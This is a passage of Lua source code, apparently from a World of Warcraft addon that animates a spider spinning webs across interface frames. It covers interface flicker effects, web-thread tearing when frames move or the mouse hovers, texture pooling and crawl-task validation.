    if type(name) == "string" and name ~= "" then
        n = name
    elseif frame and frame.GetName then
        n = frame:GetName() or ""
    end

    if n == "" then
        return "какой-то безымянный объект интерфейса"
    end

    local patterns = {
        { "ChatFrame%d+EditBox", "строку ввода чата" },
        { "ChatFrame%d+", "окно чата" },
        { "ChatFrame", "окно чата" },
        { "Minimap", "миникарту" },
        { "MiniMap", "кнопку у миникарты" },
        { "PlayerFrame", "рамку игрока" },
        { "TargetFrame", "рамку цели" },
        { "FocusFrame", "рамку фокуса" },
        { "PartyFrame", "рамку группы" },
        { "RaidFrame", "рейдовые фреймы" },
        { "CompactRaid", "рейдовые фреймы" },
        { "Grid2", "рейдовую сетку Grid2" },
        { "Grid", "рейдовую сетку" },
        { "LibDBIcon", "иконку аддона у миникарты" },
        { "FuBar", "плагин FuBar" },
        { "TomTom", "стрелку TomTom" },
        { "GameTimeFrame", "часы календаря" },
        { "TimeManager", "часы" },
        { "Bartender", "панели Bartender" },
        { "Skada", "окно Skada" },
        { "DBM", "полосу DBM" },
        { "WorldMapFrame", "карту мира" },
        { "QuestFrame", "окно заданий" },
        { "CharacterFrame", "окно персонажа" },
        { "SpellBookFrame", "книгу заклинаний" },
        { "MailFrame", "почтовый ящик" },
        { "MerchantFrame", "окно торговца" },
        { "TradeFrame", "окно обмена" },
        { "BankFrame", "окно банка" },
        { "AuctionFrame", "окно аукциона" },
        { "ContainerFrame", "сумку" },
        { "MainMenuBar", "главную панель" },
        { "MultiBar", "дополнительную панель" },
        { "ActionButton", "кнопку заклинания" },
        { "BuffFrame", "баффы" },
        { "MySpellQueue", "очередь заклинаний" },
    }

    for _, entry in ipairs(patterns) do
        if n:find(entry[1]) then
            return entry[2]
        end
    end

    return "«" .. n .. "»"
end

function NSPauk:UIFlickerAlphaAt(t, baseAlpha)
    if type(t) ~= "number" or t ~= t or t < 0 then
        return 0
    end

    if type(baseAlpha) ~= "number" or baseAlpha ~= baseAlpha or baseAlpha <= 0 then
        baseAlpha = 1
    end

    local S = self.S

    local duration = 10
    if S
        and S.uiFlicker
        and type(S.uiFlicker.duration) == "number"
        and S.uiFlicker.duration > 0 then
        duration = S.uiFlicker.duration
    end

    if t >= duration then
        return baseAlpha
    end

    local progress = t / duration

    local function sliceRand(slice, salt)
        local x = math.sin((slice + 1) * 127.1 + (salt or 0) * 311.7) * 43758.5453
        return x - math.floor(x)
    end

    if progress < 0.12 then
        local slice = math.floor(t / 0.05)

        if sliceRand(slice, 1) < 0.10 then
            return baseAlpha * 0.30
        end

        return 0
    end

    if progress < 0.45 then
        local localP = (progress - 0.12) / (0.45 - 0.12)
        local slice = math.floor(t / 0.055)
        local r = sliceRand(slice, 2)

        local onChance = 0.18 + localP * 0.42

        if r < onChance then
            if sliceRand(slice, 3) < 0.30 then
                return baseAlpha * 0.45
            end

            return baseAlpha
        end

        return 0
    end

    if progress < 0.75 then
        local localP = (progress - 0.45) / (0.75 - 0.45)
        local slice = math.floor(t / 0.08)
        local r = sliceRand(slice, 4)

        local onChance = 0.60 + localP * 0.25
        local offAlpha = baseAlpha * (0.10 + localP * 0.15)

        if r < onChance then
            return baseAlpha
        end

        return offAlpha
    end

    if progress < 0.95 then
        local localP = (progress - 0.75) / (0.95 - 0.75)
        local slice = math.floor(t / 0.12)
        local r = sliceRand(slice, 5)

        local dropoutChance = 0.22 * (1 - localP)

        if r < dropoutChance then
            return baseAlpha * 0.25
        end

        return baseAlpha
    end

    return baseAlpha
end

function NSPauk:ApplyUIFlickerAt(t)
    local S = self.S
    local f = S.uiFlicker

    if not f then
        return
    end

    local alpha = self:UIFlickerAlphaAt(t, f.baseAlpha or 1)

    if UIParent and UIParent.SetAlpha then
        UIParent:SetAlpha(alpha)
    end
end

function NSPauk:StartUIParentRestore(duration)
    local S = self.S

    duration = tonumber(duration)
    if not duration or duration ~= duration or duration <= 0 then
        duration = 10
    end

    local baseAlpha = 1

    if type(S.uiParentBaseAlpha) == "number" and S.uiParentBaseAlpha > 0 then
        baseAlpha = S.uiParentBaseAlpha
    elseif UIParent and UIParent.GetAlpha then
        local a = UIParent:GetAlpha()
        if type(a) == "number" and a > 0 then
            baseAlpha = a
        end
    end

    if S.uiFlickerTicker then
        S.uiFlickerTicker:Cancel()
        S.uiFlickerTicker = nil
    end

    if S.uiFlickerFrame then
        S.uiFlickerFrame:SetScript("OnUpdate", nil)
        S.uiFlickerFrame:Hide()
    end

    S.uiFlicker = {
        startTime = GetTime(),
        duration = duration,
        baseAlpha = baseAlpha,
    }

    S.phase = "uiRestore"

    if UIParent and UIParent.SetAlpha then
        UIParent:SetAlpha(0)
    end

    local f = S.uiFlickerFrame
    if not f then
        f = CreateFrame("Frame")
        S.uiFlickerFrame = f
    end

    f:SetScript("OnUpdate", function()
        self:UpdateUIParentRestore()
    end)
    f:Show()

    if type(C_Timer) == "table" and type(C_Timer.NewTicker) == "function" then
        S.uiFlickerTicker = C_Timer.NewTicker(0.1, function()
            if S.uiFlicker then
                self:UpdateUIParentRestore()
            end
        end)
    end
end

function NSPauk:UpdateUIParentRestore()
    local S = self.S
    local f = S.uiFlicker

    if not f then
        self:StopUIParentRestore()
        return
    end

    if not self.initialized
        or S.runtimeOff
        or S.phase == "off"
        or self:IsPersistentlyDisabled() then
        self:CancelUIParentRestore(true)
        return
    end

    local elapsed = GetTime() - (f.startTime or 0)

    if elapsed >= (f.duration or 10) then
        self:FinishUIParentRestore()
        return
    end

    self:ApplyUIFlickerAt(elapsed)
end

function NSPauk:FinishUIParentRestore()
    local S = self.S

    local base = 1

    if S.uiFlicker
        and type(S.uiFlicker.baseAlpha) == "number"
        and S.uiFlicker.baseAlpha > 0 then
        base = S.uiFlicker.baseAlpha
    elseif type(S.uiParentBaseAlpha) == "number" and S.uiParentBaseAlpha > 0 then
        base = S.uiParentBaseAlpha
    end

    if UIParent then
        if UIParent.Show then
            UIParent:Show()
        end

        if UIParent.SetAlpha then
            UIParent:SetAlpha(base)
        end
    end

    self:StopUIParentRestore()

    if S.limitReached or S.limitCocoonPending then
        self:ReturnToLimitHome()
    else
        self:StartNewInstance(nil)
    end
end

function NSPauk:StopUIParentRestore()
    local S = self.S

    if S.uiFlickerTicker then
        S.uiFlickerTicker:Cancel()
        S.uiFlickerTicker = nil
    end

    if S.uiFlickerFrame then
        S.uiFlickerFrame:SetScript("OnUpdate", nil)
        S.uiFlickerFrame:Hide()
    end

    S.uiFlicker = nil
end

function NSPauk:CancelUIParentRestore(restoreNow)
    local S = self.S

    local base = nil

    if S.uiFlicker
        and type(S.uiFlicker.baseAlpha) == "number"
        and S.uiFlicker.baseAlpha > 0 then
        base = S.uiFlicker.baseAlpha
    elseif type(S.uiParentBaseAlpha) == "number" and S.uiParentBaseAlpha > 0 then
        base = S.uiParentBaseAlpha
    end

    self:StopUIParentRestore()

    if restoreNow and UIParent then
        if UIParent.Show then
            UIParent:Show()
        end

        if UIParent.SetAlpha then
            UIParent:SetAlpha(base or 1)
        end
    end
end

function NSPauk:AbortCocoon()
    local S = self.S

    local c = S.cocoon

    if not c then
        if S.limitCocoonPending then
            S.limitCocoonPending = false

            if S.limitReached and S.phase ~= "fade" and not S.limitReturnPending then
                self:ReturnToLimitHome()
            end
        end

        return
    end

    if c.frame then
        self:SafeShowFrame(c.frame, c.baseAlpha or 1)
    end

    if c.inst then
        self:TearInstance(c.inst)
    end

    S.cocoon = nil

    if S.limitCocoonPending then
        S.limitCocoonPending = false

        if S.limitReached and S.phase ~= "fade" and not S.limitReturnPending then
            self:ReturnToLimitHome()
        end
    end
end

function NSPauk:RecycleTextures(list)
    if not list then
        return
    end

    local S = self.S

    for _, texture in ipairs(list) do
        if texture then
            if texture._nspAlive then
                texture._nspAlive = false
                S.webAliveCount = math.max(0, (S.webAliveCount or 0) - 1)
            end

            texture:Hide()

            if not texture._nspInPool then
                texture._nspInPool = true
                table.insert(S.webPool, texture)
            end
        end
    end

    for i = #list, 1, -1 do
        list[i] = nil
    end
end

function NSPauk:AddFade(textures, duration, onComplete)
    if not duration or duration <= 0 then
        duration = 0.1
    end

    if not textures or #textures == 0 then
        if onComplete then
            onComplete(self)
        end

        return
    end

    local fade = {
        timer = 0,
        duration = duration,
        textures = textures,
        baseAlphas = {},
        onComplete = onComplete,
    }

    for i, texture in ipairs(textures) do
        fade.baseAlphas[i] = texture.GetAlpha and texture:GetAlpha() or 1
    end

    table.insert(self.S.fades, fade)
end

function NSPauk:UpdateFades(dt)
    local S = self.S

    for i = #S.fades, 1, -1 do
        local fade = S.fades[i]

        fade.timer = fade.timer + dt

        local alpha = 1 - (fade.timer / fade.duration)

        if alpha <= 0 then
            self:RecycleTextures(fade.textures)
            table.remove(S.fades, i)

            if fade.onComplete then
                fade.onComplete(self)
            end
        else
            for j, texture in ipairs(fade.textures) do
                if texture:IsShown() then
                    texture:SetAlpha(alpha * (fade.baseAlphas[j] or 1))
                end
            end
        end
    end
end

function NSPauk:StartLocalFade(textures, duration)
    self:AddFade(textures, duration, nil)
end

function NSPauk:KillSeg(seg)
    if not seg or not seg.alive then
        return
    end

    seg.alive = false

    if #seg.textures > 0 then
        seg._nspHadTextures = true
        self:StartLocalFade(seg.textures, self.C.TEAR_FADE_DURATION)
        seg.textures = {}
    end

    local ref = seg.thread and seg.thread.ownerRef
    local inst = ref and ref.inst

    if inst and inst.interSegs then
        for _, inter in ipairs(inst.interSegs) do
            if inter.alive
                and (inter.parentSegA == seg or inter.parentSegB == seg) then
                self:KillSeg(inter)
            end
        end
    end

    if inst
        and not inst.torn
        and not inst.isCocoon
        and not inst.isMoth
        and inst == self.S.currentInstance
        and not seg.isInterCross then

        if inst.isNaturalRing then
            inst.nspRingCrossQueueDirty = true
            self:NP_RequestRingQueueRebuild(inst, seg)
        else
            self:NP_RequestQueueResume(inst, seg)
        end
    end
end

function NSPauk:KillConnection(inst, conn, silent)
    if not conn or not conn.alive then
        return
    end

    conn.alive = false

    if #conn.textures > 0 then
        self:StartLocalFade(conn.textures, self.C.TEAR_FADE_DURATION)
        conn.textures = {}
    end

    if inst then
        for _, other in ipairs(inst.conns) do
            if other ~= conn and other.alive then
                local killDependent = false

                if other.perimeterConn == conn then
                    killDependent = true
                end

                if other.hubDepConn == conn then
                    killDependent = true
                end

                if conn.isDiameter
                    and inst.hubDepConn == conn
                    and other.isSpoke then
                    killDependent = true
                end

                if killDependent then
                    self:KillConnection(inst, other, true)
                end
            end
        end

        for _, seg in ipairs(inst.crossSegs) do
            if seg.alive and (seg.connA == conn or seg.connB == conn) then
                self:KillSeg(seg)
            end
        end

        self:CheckInstanceDead(inst)

        if not silent and not inst.torn then
            self:NP_RecheckWebSectors(inst)
        end
    end
end

function NSPauk:TearInstance(inst)
    if not inst or inst.torn then
        return
    end

    inst.torn = true

    self:SettleInstance(inst)

    for _, conn in ipairs(inst.conns) do
        self:KillConnection(inst, conn)
    end
end

function NSPauk:CheckInstancesMovement()
    local S = self.S
    local now = GetTime()

    local killed = false

    local fullInterval = 5.0
    local doFull = not S.nspNextFullMonitorAt or now >= S.nspNextFullMonitorAt

    if doFull then
        S.nspNextFullMonitorAt = now + fullInterval
    end

    local innerCache = {}

    local function getCachedInner(frame)
        if not frame then
            return nil
        end

        if innerCache[frame] == nil then
            innerCache[frame] = self:ComputeFrameVisibleInner(frame) or false
        end

        local value = innerCache[frame]

        if value == false then
            return nil
        end

        return value
    end

    local function frameMovedCached(storedRect, frame)
        if not frame then
            return false
        end

        if not storedRect then
            return true
        end

        local cur = getCachedInner(frame)

        if not cur then
            return true
        end

        local tol = self.C.MOVEMENT_TOLERANCE

        return math.abs(cur.left - storedRect.left) > tol
            or math.abs(cur.right - storedRect.right) > tol
            or math.abs(cur.bottom - storedRect.bottom) > tol
            or math.abs(cur.top - storedRect.top) > tol
    end

    local function handleHubMoved(inst)
        if inst.isCocoon and S.cocoon and S.cocoon.inst == inst then
            self:AbortCocoon()

            if S.phase ~= "limitWait" and not S.limitReturnPending then
                if S.limitReached then
                    self:ReturnToLimitHome()
                else
                    S.phase = "watch"
                    S.stillTimer = 0
                    S.speedTimer = 0
                end
            end
        else
            self:TearInstance(inst)
        end
    end

    local function isProtectedInst(inst)
        if not inst then
            return false
        end

        if inst == S.currentInstance then
            return true
        end

        if S.cocoon and S.cocoon.inst == inst then
            return true
        end

        if S.moth and S.moth.inst == inst then
            return true
        end

        return false
    end

    local function checkInst(inst, full)
        if not inst or inst.torn then
            return false
        end

        local hubMoved = false

        if inst.hub and inst.hub.frame then
            hubMoved = frameMovedCached(inst.hub.rect, inst.hub.frame)
        end

        if hubMoved then
            handleHubMoved(inst)
            return true
        end

        if inst.isCocoon then
            return false
        end

        local k = false

        for _, conn in ipairs(inst.conns) do
            if conn.alive then
                if full or isProtectedInst(inst) then
                    local moved = false

                    if conn.target
                        and conn.target.frame
                        and conn.target.rect then
                        if frameMovedCached(conn.target.rect, conn.target.frame) then
                            moved = true
                        end
                    end

                    if not moved
                        and conn.ringStartRect
                        and conn.ringStartRect.frame then
                        if frameMovedCached(conn.ringStartRect, conn.ringStartRect.frame) then
                            moved = true
                        end
                    end

                    if moved then
                        self:KillConnection(inst, conn)
                        k = true
                    end
                end
            end
        end

        return k
    end

    if S.currentInstance then
        killed = checkInst(S.currentInstance, true) or killed
    end

    if S.cocoon
        and S.cocoon.inst
        and S.cocoon.inst ~= S.currentInstance then
        killed = checkInst(S.cocoon.inst, true) or killed
    end

    if S.moth
        and S.moth.inst
        and S.moth.inst ~= S.currentInstance
        and (not S.cocoon or S.cocoon.inst ~= S.moth.inst) then
        killed = checkInst(S.moth.inst, true) or killed
    end

    if doFull then
        for i = #S.instances, 1, -1 do
            local inst = S.instances[i]

            if not isProtectedInst(inst) then
                killed = checkInst(inst, true) or killed
            end
        end
    end

    if killed then
        S.nspSupportCache = nil
        S.nspNearCache = nil
        S.nspFreshSupportCache = nil
        S.nspAnchorRectCache = nil
    end

    self:RemoveTornInstances()

    return killed
end

function NSPauk:ThreadNearMouse(thread, mx, my, pad)
    local p0 = thread.p0
    local p2 = thread.p2

    if not p0 or not p2 then
        return false
    end

    local p1 = thread.p1

    local minX = p0.x
    local maxX = p0.x
    local minY = p0.y
    local maxY = p0.y

    if p1 then
        if p1.x < minX then
            minX = p1.x
        end

        if p1.x > maxX then
            maxX = p1.x
        end

        if p1.y < minY then
            minY = p1.y
        end

        if p1.y > maxY then
            maxY = p1.y
        end
    end

    if p2.x < minX then
        minX = p2.x
    end

    if p2.x > maxX then
        maxX = p2.x
    end

    if p2.y < minY then
        minY = p2.y
    end

    if p2.y > maxY then
        maxY = p2.y
    end

    return mx >= minX - pad
        and mx <= maxX + pad
        and my >= minY - pad
        and my <= maxY + pad
end

function NSPauk:DistToThread(thread, mx, my)
    local p0 = thread.p0
    local p2 = thread.p2

    if not p0 or not p2 then
        return math.huge
    end

    local p1 = thread.p1 or {
        x = (p0.x + p2.x) / 2,
        y = (p0.y + p2.y) / 2,
    }

    local best = math.huge
    local prevX, prevY

    for i = 0, 16 do
        local t = i / 16

        local x = self:Bz(t, p0.x, p1.x, p2.x)
        local y = self:Bz(t, p0.y, p1.y, p2.y)

        if i == 0 then
            local dx = x - mx
            local dy = y - my

            best = dx * dx + dy * dy
        else
            local d2 = self:PointSegDist2(mx, my, prevX, prevY, x, y)

            if d2 < best then
                best = d2
            end
        end

        prevX, prevY = x, y
    end

    return math.sqrt(best)
end

function NSPauk:FindThreadUnderMouse(mx, my)
    local S = self.S
    local C = self.C

    local bestThread = nil
    local bestDist = C.MOUSE_THREAD_DIST

    for _, inst in ipairs(S.instances) do
        for _, conn in ipairs(inst.conns) do
            if conn.alive and conn.thread then
                if self:ThreadNearMouse(conn.thread, mx, my, C.MOUSE_THREAD_DIST) then
                    local d = self:DistToThread(conn.thread, mx, my)

                    if d <= bestDist then
                        bestDist = d
                        bestThread = conn.thread
                    end
                end
            end
        end

        for _, seg in ipairs(inst.crossSegs) do
            if seg.alive and seg.thread then
                if self:ThreadNearMouse(seg.thread, mx, my, C.MOUSE_THREAD_DIST) then
                    local d = self:DistToThread(seg.thread, mx, my)

                    if d <= bestDist then
                        bestDist = d
                        bestThread = seg.thread
                    end
                end
            end
        end
    end

    return bestThread
end

function NSPauk:BreakThread(thread)
    local ref = thread.ownerRef

    if not ref or not ref.inst then
        return
    end

    if ref.seg then
        self:KillSeg(ref.seg)
    elseif ref.conn then
        self:KillConnection(ref.inst, ref.conn)
    end

    thread.hoverCount = 0
end

function NSPauk:ResetHoverCounts()
    local S = self.S

    for _, inst in ipairs(S.instances) do
        for _, conn in ipairs(inst.conns) do
            if conn.thread then
                conn.thread.hoverCount = 0
            end
        end

        for _, seg in ipairs(inst.crossSegs) do
            if seg.thread then
                seg.thread.hoverCount = 0
            end
        end
    end
end

function NSPauk:CheckMouseThreads(dt)
    local S = self.S
    local C = self.C

    S.mouseTimer = S.mouseTimer + dt

    if S.mouseTimer < C.MOUSE_CHECK then
        return
    end

    S.mouseTimer = 0

    if #S.instances == 0 then
        S.mouseOnThread = nil
        S.mouseIdle = 0
        S.mouseLastX = nil
        S.mouseLastY = nil
        return
    end

    if not GetCursorPosition then
        return
    end

    local scale = self:EffScale(UIParent)
    local mx, my = GetCursorPosition()

    mx = mx / scale
    my = my / scale

    if S.mouseLastX
        and S.mouseLastY
        and math.abs(mx - S.mouseLastX) < 1
        and math.abs(my - S.mouseLastY) < 1 then

        if S.mouseOnThread then
            local ref = S.mouseOnThread.ownerRef
            local alive = ref
                and (
                    (ref.conn and ref.conn.alive)
                    or (ref.seg and ref.seg.alive)
                )

            if not alive then
                S.mouseOnThread = nil
            end
        end

        if S.mouseOnThread then
            S.mouseIdle = 0
        else
            S.mouseIdle = S.mouseIdle + C.MOUSE_CHECK

            if S.mouseIdle >= C.MOUSE_STREAK_RESET then
                self:ResetHoverCounts()
                S.mouseIdle = 0
            end
        end

        return
    end

    S.mouseLastX = mx
    S.mouseLastY = my

    local hit = self:FindThreadUnderMouse(mx, my)

    if hit then
        S.mouseIdle = 0

        if S.mouseOnThread ~= hit then
            S.mouseOnThread = hit
            hit.hoverCount = (hit.hoverCount or 0) + 1

            if hit.hoverCount > C.MOUSE_HOVER_LIMIT then
                self:BreakThread(hit)
                S.mouseOnThread = nil
            end
        end
    else
        S.mouseOnThread = nil
        S.mouseIdle = S.mouseIdle + C.MOUSE_CHECK

        if S.mouseIdle >= C.MOUSE_STREAK_RESET then
            self:ResetHoverCounts()
            S.mouseIdle = 0
        end
    end
end

function NSPauk:MkSpider()
    local S = self.S
    local C = self.C
    local parent = S.spiderFrame or S.activeFrame
    local spider = S.spider

    if spider and spider:GetParent() ~= parent then
        spider:Hide()
        S.spider = nil
        spider = nil
    end

    if not spider then
        spider = parent:CreateTexture(nil, "OVERLAY")
        S.spider = spider
    end

    if type(S.spiderAnimIndex) ~= "number" then
        S.spiderAnimIndex = 1
    end

    if type(S.spiderAnimTimer) ~= "number" then
        S.spiderAnimTimer = 0
    end

    if type(S.spiderFacing) ~= "number" then
        S.spiderFacing = 0
    end

    S.spiderAnimMoving = false
    S.spiderAnimInitialized = false
    S.spiderAnimLastX = S.spiderVisualX or S.lastSpiderX or 0
    S.spiderAnimLastY = S.spiderVisualY or S.lastSpiderY or 0

    self:ApplySpiderTexture(S.spiderAnimIndex)

    spider:SetWidth(C.SPIDER_SIZE)
    spider:SetHeight(C.SPIDER_SIZE)
    spider:SetDrawLayer("OVERLAY")
    spider:Show()
end

function NSPauk:PutSpider(x, y)
    local S = self.S

    S.lastSpiderX = x
    S.lastSpiderY = y

    if S.spider then
        if S.spiderVisualObject ~= S.spider
            or not S.spiderVisualX
            or not S.spiderVisualY
            or math.abs(x - S.spiderVisualX) >= 0.25
            or math.abs(y - S.spiderVisualY) >= 0.25 then

            S.spider:ClearAllPoints()
            S.spider:SetPoint("CENTER", UIParent, "BOTTOMLEFT", x, y)

            S.spiderVisualObject = S.spider
            S.spiderVisualX = x
            S.spiderVisualY = y
        end
    end

    if S.clickBtn then
        if S.clickVisualObject ~= S.clickBtn
            or not S.clickVisualX
            or not S.clickVisualY
            or math.abs(x - S.clickVisualX) >= 0.25
            or math.abs(y - S.clickVisualY) >= 0.25 then

            S.clickBtn:ClearAllPoints()
            S.clickBtn:SetPoint("CENTER", UIParent, "BOTTOMLEFT", x, y)

            S.clickVisualObject = S.clickBtn
            S.clickVisualX = x
            S.clickVisualY = y
        end
    end
end

function NSPauk:HideSpider()
    local S = self.S

    if S.spider then
        S.spider:Hide()
    end

    if S.clickBtn then
        S.clickBtn:Hide()
    end
end

function NSPauk:DropWebForTask(task, x, y)
    local S = self.S
    local C = self.C

    local owner = task.owner

    if not owner or not owner.alive then
        return
    end

    local maxSegs = tonumber(C.MAX_WEB_SEGS) or 0

    if maxSegs > 0 and (S.webAliveCount or 0) >= maxSegs then
        return
    end

    local texture

    if #S.webPool > 0 then
        texture = table.remove(S.webPool)

        if texture then
            texture._nspInPool = false
        end
    elseif maxSegs <= 0 or (S.webAliveCount or 0) < maxSegs then
        texture = S.activeFrame:CreateTexture(nil, "OVERLAY")
        S.webCreated = S.webCreated + 1
    else
        return
    end

    if not texture then
        return
    end

    texture:SetTexture(C.TEX_WEB)
    texture:SetWidth(C.WEB_SIZE)
    texture:SetHeight(C.WEB_SIZE)
    texture:SetVertexColor(1, 1, 1, 1)
    texture:SetAlpha(C.WEB_ALPHA)
    texture:SetDrawLayer("OVERLAY")
    texture:ClearAllPoints()
    texture:SetPoint("CENTER", UIParent, "BOTTOMLEFT", x, y)
    texture:Show()

    owner.textures[#owner.textures + 1] = texture

    if not texture._nspAlive then
        texture._nspAlive = true
        S.webAliveCount = (S.webAliveCount or 0) + 1
    end

    local inst = self:GetOwnerInstance(owner)

    if inst then
        inst.drawnPoints = (inst.drawnPoints or 0) + 1

        if not inst.isCocoon and not inst.isMoth then
            S.sessionBurstPoints = (tonumber(S.sessionBurstPoints) or 0) + 1
        end
    end

    S.webPoints = S.webPoints + 1

    if #owner.textures == 1 and not owner._nspCrossCounted then
        if owner.connA
            or owner.connB
            or owner.isHeal
            or owner.isInterCross then
            owner._nspCrossCounted = true

            if inst
                and not inst.torn
                and not inst.isCocoon
                and not inst.isMoth then
                inst.builtCrossCount = (inst.builtCrossCount or 0) + 1

                if (inst.builtCrossCount % 10) == 0 then
                    self:NP_RequestSectorRecheck(inst)
                end
            end
        end
    end
end

function NSPauk:DropAlongCurve(task, t0, t1)
    local S = self.S
    local C = self.C

    if not task or not task.drop then
        return
    end

    if not t0 or not t1 or t1 <= t0 then
        return
    end

    local spacing = self:GetWebPointSpacingForTask(task)

    if type(spacing) ~= "number" or spacing ~= spacing or spacing <= 0 then
        spacing = 1
    end

    task.dropSpacing = spacing

    local totalLen = task.pathLength

    if type(totalLen) ~= "number" or totalLen <= 0 then
        totalLen = self:ApproxThreadLength(task)
        task.pathLength = totalLen
    end

    if totalLen <= 0 then
        return
    end

    local segLen = totalLen * (t1 - t0)

    if segLen <= 0 then
        return
    end

    if type(task.dropRemainder) ~= "number" or task.dropRemainder < 0 then
        task.dropRemainder = 0
    end

    local total = task.dropRemainder + segLen

    if total < spacing then
        task.dropRemainder = total

        local lx, ly = self:BzThread(task, t1)

        S.lastDropX = lx
        S.lastDropY = ly

        return
    end

    local planned = math.floor(total / spacing)

    if planned < 1 then
        planned = 1
    end

    local baseHard = math.max(tonumber(C.MAX_DROPS_PER_FRAME) or 140, 500)
    local hard = baseHard

    if planned > hard then
        hard = math.min(planned, 5000)
    end

    local span = t1 - t0
    local lastX, lastY

    if planned > hard then
        for i = 1, hard do
            local f = i / hard
            local t = t0 + span * f

            local x, y = self:BzThread(task, t)

            self:DropWebForTask(task, x, y)

            lastX, lastY = x, y
        end

        task.dropRemainder = 0
    else
        for i = 1, planned do
            local distFromStart = i * spacing - task.dropRemainder

            if distFromStart < 0 then
                distFromStart = 0
            end

            if distFromStart > segLen then
                distFromStart = segLen
            end

            local f = 0

            if segLen > 0 then
                f = distFromStart / segLen
            end

            local t = t0 + span * f

            local x, y = self:BzThread(task, t)

            self:DropWebForTask(task, x, y)

            lastX, lastY = x, y
        end

        task.dropRemainder = total - planned * spacing

        if task.dropRemainder < 0 then
            task.dropRemainder = 0
        end
    end

    if lastX then
        S.lastDropX = lastX
        S.lastDropY = lastY
    else
        local lx, ly = self:BzThread(task, t1)

        S.lastDropX = lx
        S.lastDropY = ly
    end
end

function NSPauk:FinishClickFade()
    local S = self.S

    S.webAliveCount = 0
    S.phase = "disabled"
    S.disableTimer = 0
end

function NSPauk:MkClickBtn()
    local S = self.S
    local C = self.C

    local parent = S.clickFrame or S.spiderFrame or S.activeFrame

    local btn = S.clickBtn

    if btn and btn:GetParent() ~= parent then
        btn:Hide()

        S.clickBtn = nil
        btn = nil
    end

    if not btn then
        btn = CreateFrame("Button", nil, parent)

        btn:EnableMouse(true)
        btn:RegisterForClicks("LeftButtonUp", "RightButtonUp")

        btn:SetScript("OnClick", function(_, button)
            NSPauk:OnSpiderClick(button)
        end)

        S.clickBtn = btn
    end

    btn:SetWidth(C.SPIDER_SIZE)
    btn:SetHeight(C.SPIDER_SIZE)
    btn:SetFrameLevel(parent:GetFrameLevel() + 1)
    btn:Show()
end

function NSPauk:IsMoving()
    local C = self.C

    local speed = GetUnitSpeed and GetUnitSpeed("player") or nil

    if not speed then
        return false
    end

    return speed > C.SPEED_THRESHOLD
end

function NSPauk:IsTaskValid(task)
  if not task then
    return false
  end

  local S = self.S

  if task.nspFall then
    return true
  end

  if task.nspPlan then
    if task.owner and not task.owner.alive then
      return false
    end

    if task.conn and not task.conn.alive then
      return false
    end

    if task.owner and (task.owner.connA or task.owner.connB) then
      if task.owner.connA and not task.owner.connA.alive then
        return false
      end

      if task.owner.connB and not task.owner.connB.alive then
        return false
      end
    end

    return true
  end

  if task.nspCrawl then
    if task.owner and not task.owner.alive then
      return false
    end

    if task.conn and not task.conn.alive then
      return false
    end

    if task.nspDuringDrag then
      if not S.nspDrag or not S.nspDrag.owner or not S.nspDrag.owner.alive then
        return false
      end
    end
  else
    if task.kind == "thread" then
      local owner = task.owner

      if not owner or not owner.alive then
        return false
      end

      if task.nspNoSupportCheck then
        return true
      end

      local ref = owner.thread and owner.thread.ownerRef
      local inst = ref and ref.inst

      if not inst then
        return false
      end

      if owner.connA or owner.connB then
        if owner.connA and not self:ValidateConnection(inst, owner.connA) then
          return false
        end

        if owner.connB and not self:ValidateConnection(inst, owner.connB) then
          return false
        end

        if owner.parentSegA and not owner.parentSegA.alive then
          return false
        end

        if owner.parentSegB and not owner.parentSegB.alive then
          return false
        end
      elseif owner.target then
        if not self:ValidateConnection(inst, owner) then
          return false
        end
      end

      return true
    end

    if task.kind == "travel" then
      if task.owner then
        if not task.owner.alive then
          return false
        end

        if not task.nspNoSupportCheck then
          local ref = task.owner.thread and task.owner.thread.ownerRef
          local inst = ref and ref.inst

          if inst then
            if task.owner.connA or task.owner.connB then
              if task.owner.connA and not self:ValidateConnection(inst, task.owner.connA) then
                return false
              end

              if task.owner.connB and not self:ValidateConnection(inst, task.owner.connB) then
                return false
              end

              if task.owner.parentSegA and not task.owner.parentSegA.alive then
                return false
              end

              if task.owner.parentSegB and not task.owner.parentSegB.alive then
                return false
              end
            elseif task.owner.target then
              if not self:ValidateConnection(inst, task.owner) then
                return false
              end
            end
          end
        end
      end

      if task.conn and not task.conn.alive then
        return false
      end

      if task.conn and not task.nspNoSupportCheck then
        local ref = task.conn.thread and task.conn.thread.ownerRef
        local inst = ref and ref.inst

        if inst and not self:ValidateConnection(inst, task.conn) then
          return false
        end
      end

      return true
    end

    return false
  end

  if task.nspCrawl and not task.nspNoSupportCheck then
    if S.spider and S.spider:IsShown() then
      local now = GetTime()
      local interval = 0.10

      if not task._nspCurSupportAt or (now - task._nspCurSupportAt) >= interval then
        task._nspCurSupportAt = now
        task._nspCurSupportOK = self:NP_ValidateTaskCurrentSupport(
          task,
          S.lastSpiderX or 0,
          S.lastSpiderY or 0
        )
      end

      if task._nspCurSupportOK == false then
        return false
      end
    end
  end

  return true
end

function NSPauk:GetWebPointSpacing()
    local C = self.C or {}

    local spacing = tonumber(C.WEB_POINT_SPACING_MAX)

    if not spacing or spacing ~= spacing or spacing <= 0 then
        spacing = 1
    end

    local webSize = tonumber(C.WEB_SIZE) or 2
    local maxSpacing = math.max(1, webSize * 0.75)

    if spacing > maxSpacing then
        spacing = maxSpacing
    end

    return spacing
end

function NSPauk:IsEmptyMovementTask(task)
  if not task then
    return false
  end

  if task.drop then
    return false
  end

  if task.nspDuringDrag or task.nspStartDragTask or task.nspFall then
    return false
  end

  if task.kind == "travel" or task.nspCrawl then
    return true
  end

  return false
end

function NSPauk:NP_MakeCrawlTask(a, b, plan)
    local function copySupport(p)
        if not p then
            return nil
        end

        if p.kind == "frame"
            or p.kind == "web"
            or p.kind == "edge"
            or p.kind == "hub" then

            return {
                kind = p.kind,
                frame = p.frame,
                family = p.family,
                thread = p.thread,
                edgeSide = p.edgeSide,
                hubInstance = p.hubInstance,
                name = p.name,
            }
        end

        if type(p.x) == "number" and type(p.y) == "number" then
            local sup = self:NP_FindSupportAt(p.x, p.y)

            if sup then
                return sup
            end
        end

        return nil
    end

    local task = {
        kind = "travel",
        nspCrawl = true,
        drop = false,
        p0 = copyPoint(a),
        p1 = {
            x = (a.x + b.x) / 2,
            y = (a.y + b.y) / 2,
        },
        p2 = copyPoint(b),
        conn = plan and plan.conn,
        owner = plan and plan.owner,
        nspNoInsert = true,
    }

    task.nspSupportA = copySupport(a)
    task.nspSupportB = copySupport(b)

    if plan then
        task.isCross = plan.isCross
        task.isMain = plan.isMain
    end

    return task
end

function NSPauk:NP_ResetRouteHistory()
    local S = self.S
